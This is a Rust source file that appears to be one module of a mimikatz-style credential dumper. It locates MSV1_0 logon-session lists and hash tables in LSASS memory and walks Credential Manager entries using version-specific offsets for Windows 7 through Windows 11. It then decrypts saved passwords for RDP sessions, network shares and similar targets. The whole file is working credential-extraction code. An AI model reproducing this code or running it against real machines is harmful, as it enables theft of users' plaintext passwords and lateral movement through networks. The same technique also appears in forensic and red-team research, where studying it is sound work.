use crate::error::Result;
use crate::lsass::crypto::CryptoKeys;
use crate::lsass::types::CredmanCredential;
use crate::memory::VirtualMemory;
use crate::pe::parser::PeHeaders;

/// MSV1_0_LIST entry offsets for the CredentialManager pointer.
/// The CredentialManager field follows the Credentials (pCredentials) pointer.
///
/// For Win10 1607+ (variant 2 in msv.rs): credentials_ptr=0x108, credman_ptr=0x110
struct CredmanMsvOffsets {
    flink: u64,
    luid: u64,
    username: u64,
    credman_ptr: u64,
}

const CREDMAN_MSV_OFFSET_VARIANTS: &[CredmanMsvOffsets] = &[
    // Win10 1607+ / Win11 (build 14393+)
    CredmanMsvOffsets {
        flink: 0x00,
        luid: 0x90,
        username: 0xA8,
        credman_ptr: 0x110,
    },
    // Win10 1507-1511
    CredmanMsvOffsets {
        flink: 0x00,
        luid: 0x70,
        username: 0x80,
        credman_ptr: 0xF0,
    },
    // Win8/8.1
    CredmanMsvOffsets {
        flink: 0x00,
        luid: 0x60,
        username: 0x70,
        credman_ptr: 0xE0,
    },
    // Win7 SP1
    CredmanMsvOffsets {
        flink: 0x00,
        luid: 0x30,
        username: 0x40,
        credman_ptr: 0xC0,
    },
];

/// KIWI_CREDMAN_LIST_STARTER offsets (Win10 19041+):
///   Read at CredentialManager + STARTER_OFFSET
///   +0x00: start (u32)
///   +0x08: unk0 (ptr)
///   +0x10: unk1 (ptr)
///   +0x18: unk2 (ptr)
///   +0x20: list (LIST_ENTRY) -> first KIWI_CREDMAN_SET_LIST_ENTRY
const STARTER_OFFSET: u64 = 0x10; // Win10 1903+ offset from CredentialManager
const STARTER_LIST_OFFSET: u64 = 0x20; // list field within KIWI_CREDMAN_LIST_STARTER

/// KIWI_CREDMAN_SET_LIST_ENTRY offsets (Win10 19041+):
///   +0x00: Flink
///   +0x08: Blink
///   +0x10: unk0 (u32+u32)
///   +0x18: start1 (LIST_ENTRY)
///   +0x28: start2 (LIST_ENTRY)
///   +0x38..+0x48: unk ptrs
///   +0x50: cbEncPassword (u32)
///   +0x58: encPassword (ptr)
///   +0x60..+0x68: unk ptrs
///   +0x70: UserName (PWSTR)
///   +0x78: cbUserName (u32)
///   +0x80..+0x88: unk ptrs
///   +0x90: type (PWSTR)
///   +0x98: cbType (u32)
///   +0xA0: server1/target (PWSTR)
///   +0xA8: cbServer1 (u32)
struct CredmanEntryOffsets {
    cb_enc_password: u64,
    enc_password: u64,
    username: u64,
    cb_username: u64,
    server1: u64,
    cb_server1: u64,
}

const CREDMAN_ENTRY_VARIANTS: &[CredmanEntryOffsets] = &[
    // Win10 19041+ / 22H2
    CredmanEntryOffsets {
        cb_enc_password: 0x50,
        enc_password: 0x58,
        username: 0x70,
        cb_username: 0x78,
        server1: 0xA0,
        cb_server1: 0xA8,
    },
    // Win10 1607+ (slightly different layout)
    CredmanEntryOffsets {
        cb_enc_password: 0x68,
        enc_password: 0x70,
        username: 0x78,
        cb_username: 0x80,
        server1: 0xB0,
        cb_server1: 0xB8,
    },
];

/// Extract Credential Manager saved credentials from MSV1_0 logon sessions.
///
/// Credman credentials are stored per-session inside MSV1_0 logon session entries.
/// Each entry has a CredentialManager pointer leading to a linked list of saved
/// credentials (RDP passwords, network share credentials, etc.).
pub fn extract_credman_credentials(
    vmem: &impl VirtualMemory,
    msv_base: u64,
    _msv_size: u32,
    keys: &CryptoKeys,
) -> Result<Vec<(u64, CredmanCredential)>> {
    let pe = PeHeaders::parse_from_memory(vmem, msv_base)?;
    let mut all_results = Vec::new();
    let mut validated = false;

    // Strategy 1: Try hash table walk (LogonSessionListCount hash table, most common)
    let tables = find_inline_hash_table(vmem, &pe, msv_base)?;
    log::debug!("Credman: found {} hash table candidates", tables.len());

    'ht: for (table_addr, bucket_count) in &tables {
        for offsets in CREDMAN_MSV_OFFSET_VARIANTS {
            if !validate_hash_table_variant(vmem, *table_addr, *bucket_count, offsets) {
                continue;
            }
            log::debug!(
                "Credman: validated hash table at 0x{:x} ({} buckets) with variant luid=0x{:x}",
                table_addr,
                bucket_count,
                offsets.luid
            );
            let results =
                walk_hash_table_for_credman(vmem, *table_addr, *bucket_count, offsets, keys);
            all_results = results;
            validated = true;
            break 'ht;
        }
    }

    // Strategy 2: Fallback to single-list candidates (LogonSessionList)
    if !validated {
        let list_candidates = find_msv_list_candidates(vmem, &pe, msv_base)?;
        log::debug!(
            "Credman: found {} single-list candidates",
            list_candidates.len()
        );

        if !list_candidates.is_empty() {
            if let Some(results) = try_single_list_candidates(vmem, &list_candidates, keys) {
                all_results = results;
            }
        }
    }

    log::info!("Credman: found {} entries", all_results.len());
    Ok(all_results)
}

/// Try single-list candidates with each offset variant.
/// Validates by checking username AND LUID at the given offsets.
fn try_single_list_candidates(
    vmem: &impl VirtualMemory,
    list_candidates: &[u64],
    keys: &CryptoKeys,
) -> Option<Vec<(u64, CredmanCredential)>> {
    for list_addr in list_candidates {
        for offsets in CREDMAN_MSV_OFFSET_VARIANTS {
            let head_flink = match vmem.read_virt_u64(*list_addr) {
                Ok(f) => f,
                Err(_) => continue,
            };
            if head_flink == 0 || head_flink == *list_addr {
                continue;
            }

            // Validate: walk up to 10 entries to find one with a readable username AND valid LUID
            let mut test_current = head_flink;
            let mut test_visited = std::collections::HashSet::new();
            let mut found_valid = false;
            for _ in 0..10 {
                if test_current == *list_addr
                    || test_visited.contains(&test_current)
                    || test_current == 0
                {
                    break;
                }
                test_visited.insert(test_current);
                let test_username = vmem
                    .read_win_unicode_string(test_current + offsets.username)
                    .unwrap_or_default();
                let test_luid = vmem.read_virt_u64(test_current + offsets.luid).unwrap_or(0);
                // LUID should be non-zero and reasonable (< 0x100000 typically)
                if !test_username.is_empty() && test_luid > 0 && test_luid < 0x100000 {
                    found_valid = true;
                    break;
                }
                test_current = match vmem.read_virt_u64(test_current + offsets.flink) {
                    Ok(f) => f,
                    Err(_) => break,
                };
            }
            if !found_valid {
                continue;
            }

            log::debug!(
                "Credman: using single-list at 0x{:x} with variant (luid=0x{:x}, credman=0x{:x})",
                list_addr,
                offsets.luid,
                offsets.credman_ptr
            );

            let results = walk_msv_for_credman(vmem, *list_addr, offsets, keys);
            return Some(results);
        }
    }
    None
}

/// Validate that a hash table with given offsets produces readable usernames.
fn validate_hash_table_variant(
    vmem: &impl VirtualMemory,
    table_addr: u64,
    bucket_count: usize,
    offsets: &CredmanMsvOffsets,
) -> bool {
    for bucket_idx in 0..bucket_count {
        let bucket_addr = table_addr + (bucket_idx as u64) * 16;
        let flink = match vmem.read_virt_u64(bucket_addr) {
            Ok(f) => f,
            Err(_) => continue,
        };
        if flink == bucket_addr || flink == 0 || !is_heap_ptr(flink) {
            continue;
        }
        // Try reading username from the entry
        let username = vmem
            .read_win_unicode_string(flink + offsets.username)
            .unwrap_or_default();
        if !username.is_empty() {
            return true;
        }
    }
    false
}

/// Walk the MSV logon session list and extract Credman entries from each session.
fn walk_msv_for_credman(
    vmem: &impl VirtualMemory,
    list_addr: u64,
    offsets: &CredmanMsvOffsets,
    keys: &CryptoKeys,
) -> Vec<(u64, CredmanCredential)> {
    let mut results = Vec::new();
    let head_flink = match vmem.read_virt_u64(list_addr) {
        Ok(f) => f,
        Err(_) => return results,
    };

    let mut current = head_flink;
    let mut visited = std::collections::HashSet::new();

    loop {
        if current == list_addr || visited.contains(&current) || current == 0 {
            break;
        }
        visited.insert(current);

        let luid = vmem.read_virt_u64(current + offsets.luid).unwrap_or(0);
        let credman_ptr = vmem
            .read_virt_u64(current + offsets.credman_ptr)
            .unwrap_or(0);

        let username = vmem
            .read_win_unicode_string(current + offsets.username)
            .unwrap_or_default();
        log::debug!(
            "Credman: MSV entry at 0x{:x} LUID=0x{:x} user='{}' CredmanPtr=0x{:x}",
            current,
            luid,
            username,
            credman_ptr
        );

        if is_heap_ptr(credman_ptr) {
            extract_credman_from_ptr(vmem, credman_ptr, luid, keys, &mut results);
        }

        current = match vmem.read_virt_u64(current + offsets.flink) {
            Ok(f) => f,
            Err(_) => break,
        };
    }

    results
}

/// Walk all buckets in an inline hash table and extract Credman entries.
fn walk_hash_table_for_credman(
    vmem: &impl VirtualMemory,
    table_addr: u64,
    bucket_count: usize,
    offsets: &CredmanMsvOffsets,
    keys: &CryptoKeys,
) -> Vec<(u64, CredmanCredential)> {
    let mut results = Vec::new();
    let mut entries_found = 0u32;

    for bucket_idx in 0..bucket_count {
        let bucket_addr = table_addr + (bucket_idx as u64) * 16;
        let flink = match vmem.read_virt_u64(bucket_addr) {
            Ok(f) => f,
            Err(_) => continue,
        };

        // Skip empty buckets (self-referencing)
        if flink == bucket_addr || flink == 0 || !is_heap_ptr(flink) {
            continue;
        }

        // Walk the chain for this bucket
        let mut current = flink;
        let mut visited = std::collections::HashSet::new();

        loop {
            if current == bucket_addr || visited.contains(&current) || current == 0 {
                break;
            }
            visited.insert(current);

            let luid = vmem.read_virt_u64(current + offsets.luid).unwrap_or(0);
            let username = vmem
                .read_win_unicode_string(current + offsets.username)
                .unwrap_or_default();
            let credman_ptr = vmem
                .read_virt_u64(current + offsets.credman_ptr)
                .unwrap_or(0);

            if !username.is_empty() {
                entries_found += 1;
                log::debug!(
                    "Credman: hash bucket {} entry at 0x{:x} LUID=0x{:x} user='{}' CredmanPtr=0x{:x}",
                    bucket_idx, current, luid, username, credman_ptr
                );

                if is_heap_ptr(credman_ptr) {
                    extract_credman_from_ptr(vmem, credman_ptr, luid, keys, &mut results);
                }
            }

            current = match vmem.read_virt_u64(current + offsets.flink) {
                Ok(f) => f,
                Err(_) => break,
            };
        }
    }

    if entries_found > 0 {
        log::debug!(
            "Credman: hash table 0x{:x} ({} buckets): {} MSV entries, {} credman entries",
            table_addr,
            bucket_count,
            entries_found,
            results.len()
        );
    }

    results
}

/// Extract Credman credentials from a CredentialManager pointer.
fn extract_credman_from_ptr(
    vmem: &impl VirtualMemory,
    credman_ptr: u64,
    luid: u64,
    keys: &CryptoKeys,
    results: &mut Vec<(u64, CredmanCredential)>,
) {
    log::debug!(
        "Credman: LUID=0x{:x} CredentialManager=0x{:x}",
        luid,
        credman_ptr
    );

    // Read the list head from the KIWI_CREDMAN_LIST_STARTER
    let list_head = credman_ptr + STARTER_OFFSET + STARTER_LIST_OFFSET;
    let list_flink = vmem.read_virt_u64(list_head).unwrap_or(0);

    if list_flink != 0 && list_flink != list_head && is_heap_ptr(list_flink) {
        let entries = walk_credman_list(vmem, list_head, keys);
        for entry in entries {
            results.push((luid, entry));
        }
    } else {
        log::debug!(
            "Credman: list at 0x{:x} is empty or self-referencing",
            list_head
        );
    }
}

/// Walk the Credman linked list and extract credentials.
fn walk_credman_list(
    vmem: &impl VirtualMemory,
    list_head: u64,
    keys: &CryptoKeys,
) -> Vec<CredmanCredential> {
    let mut results = Vec::new();
    let mut current = match vmem.read_virt_u64(list_head) {
        Ok(f) => f,
        Err(_) => return results,
    };
    let mut visited = std::collections::HashSet::new();

    loop {
        if current == list_head || visited.contains(&current) || current == 0 {
            break;
        }
        visited.insert(current);

        // Try each entry offset variant
        for entry_offsets in CREDMAN_ENTRY_VARIANTS {
            if let Some(cred) = try_extract_credman_entry(vmem, current, entry_offsets, keys) {
                results.push(cred);
                break;
            }
        }

        current = match vmem.read_virt_u64(current) {
            Ok(f) => f,
            Err(_) => break,
        };
    }

    results
}

/// Try to extract a single Credman entry using the given offsets.
fn try_extract_credman_entry(
    vmem: &impl VirtualMemory,
    entry_addr: u64,
    offsets: &CredmanEntryOffsets,
    keys: &CryptoKeys,
) -> Option<CredmanCredential> {
    // Read username (PWSTR + cbUserName)
    let username_ptr = vmem.read_virt_u64(entry_addr + offsets.username).ok()?;
    let cb_username = vmem.read_virt_u32(entry_addr + offsets.cb_username).ok()? as usize;

    if !is_heap_ptr(username_ptr) || cb_username == 0 || cb_username > 0x200 {
        return None;
    }

    let username = read_pwstr(vmem, username_ptr, cb_username);
    if username.is_empty() {
        return None;
    }

    // Read target/server1 (PWSTR + cbServer1)
    let server_ptr = vmem.read_virt_u64(entry_addr + offsets.server1).ok()?;
    let cb_server = vmem.read_virt_u32(entry_addr + offsets.cb_server1).ok()? as usize;

    let target = if is_heap_ptr(server_ptr) && cb_server > 0 && cb_server <= 0x400 {
        read_pwstr(vmem, server_ptr, cb_server)
    } else {
        String::new()
    };

    // Read encrypted password
    let cb_enc = vmem
        .read_virt_u32(entry_addr + offsets.cb_enc_password)
        .ok()? as usize;
    let enc_ptr = vmem.read_virt_u64(entry_addr + offsets.enc_password).ok()?;

    let password = if cb_enc > 0 && cb_enc <= 0x400 && is_heap_ptr(enc_ptr) {
        let enc_data = vmem.read_virt_bytes(enc_ptr, cb_enc).ok()?;
        match crate::lsass::crypto::decrypt_credential(keys, &enc_data) {
            Ok(dec) => crate::lsass::crypto::decode_utf16_le(&dec),
            Err(_) => String::new(),
        }
    } else {
        String::new()
    };

    log::debug!(
        "Credman entry: user='{}' target='{}' pwd_len={}",
        username,
        target,
        password.len()
    );

    Some(CredmanCredential {
        username: username.clone(),
        domain: String::new(), // Credman uses target instead of domain
        password,
        target,
    })
}

/// Read a PWSTR (raw wide string pointer) with known byte count.
fn read_pwstr(vmem: &impl VirtualMemory, ptr: u64, cb: usize) -> String {
    if cb == 0 || !is_heap_ptr(ptr) {
        return String::new();
    }
    let data = match vmem.read_virt_bytes(ptr, cb) {
        Ok(d) => d,
        Err(_) => return String::new(),
    };
    crate::lsass::crypto::decode_utf16_le(&data)
}

/// Find MSV logon session list candidates in msv1_0.dll .data section.
/// Matches topology: flink -> heap entry whose blink -> list_addr, and entry_flink is valid.
fn find_msv_list_candidates(
    vmem: &impl VirtualMemory,
    pe: &PeHeaders,
    msv_base: u64,
) -> Result<Vec<u64>> {
    let data_sec = match pe.find_section(".data") {
        Some(s) => s,
        None => return Ok(Vec::new()),
    };

    let data_base = msv_base + data_sec.virtual_address as u64;
    let data_size = std::cmp::min(data_sec.virtual_size as usize, 0x10000);
    let data = vmem.read_virt_bytes(data_base, data_size)?;

    let mut candidates = Vec::new();

    for off in (0..data_size.saturating_sub(16)).step_by(8) {
        let flink = u64::from_le_bytes(data[off..off + 8].try_into().unwrap());
        let blink = u64::from_le_bytes(data[off + 8..off + 16].try_into().unwrap());

        if !is_heap_ptr(flink) || !is_heap_ptr(blink) {
            continue;
        }
        // Must point to heap, not within the DLL
        if flink >= msv_base && flink < msv_base + 0x100000 {
            continue;
        }

        let list_addr = data_base + off as u64;

        // Validate: entry's Blink should point back to the list head
        let entry_blink = match vmem.read_virt_u64(flink + 0x08) {
            Ok(b) => b,
            Err(_) => continue,
        };
        if entry_blink != list_addr {
            continue;
        }

        // Validate: entry's Flink should be list_addr (single-entry) or a valid heap ptr
        let entry_flink = match vmem.read_virt_u64(flink) {
            Ok(f) => f,
            Err(_) => continue,
        };
        if entry_flink != list_addr && !is_heap_ptr(entry_flink) {
            continue;
        }

        candidates.push(list_addr);
    }

    Ok(candidates)
}

/// Search the .data section for an inline LogonSessionList hash table.
/// The hash table is an array of LIST_ENTRY (16 bytes each) where:
///   - Empty buckets have Flink=Blink=&self (self-referencing .data address)
///   - Non-empty buckets have Flink pointing to first MSV1_0_LIST entry (heap)
fn find_inline_hash_table(
    vmem: &impl VirtualMemory,
    pe: &PeHeaders,
    msv_base: u64,
) -> Result<Vec<(u64, usize)>> {
    let msv_end = msv_base + 0x100000;
    let data_sec = match pe.find_section(".data") {
        Some(s) => s,
        None => return Ok(Vec::new()),
    };

    let data_base = msv_base + data_sec.virtual_address as u64;
    let data_size = std::cmp::min(data_sec.virtual_size as usize, 0x10000);
    let data = vmem.read_virt_bytes(data_base, data_size)?;

    let mut tables = Vec::new();
    let mut run_start: Option<usize> = None;
    let mut run_count = 0usize;

    for off in (0..data_size.saturating_sub(16)).step_by(16) {
        let flink = u64::from_le_bytes(data[off..off + 8].try_into().unwrap());
        let blink = u64::from_le_bytes(data[off + 8..off + 16].try_into().unwrap());
        let self_addr = data_base + off as u64;

        let flink_is_self = flink == self_addr;
        let blink_is_self = blink == self_addr;
        let flink_is_dll = flink >= msv_base && flink < msv_end;
        let blink_is_dll = blink >= msv_base && blink < msv_end && !blink_is_self;

        let is_valid_bucket = (flink_is_self && blink_is_self)
            || (is_heap_ptr(flink)
                && !flink_is_dll
                && (blink_is_self || (is_heap_ptr(blink) && !blink_is_dll)));

        if is_valid_bucket {
            if run_start.is_none() {
                run_start = Some(off);
            }
            run_count += 1;
        } else {
            if let Some(start) = run_start.filter(|_| run_count >= 5) {
                let table_addr = data_base + start as u64;
                tables.push((table_addr, run_count));
            }
            run_start = None;
            run_count = 0;
        }
    }
    if let Some(start) = run_start.filter(|_| run_count >= 5) {
        let table_addr = data_base + start as u64;
        tables.push((table_addr, run_count));
    }

    Ok(tables)
}

use crate::lsass::patterns::is_heap_ptr;
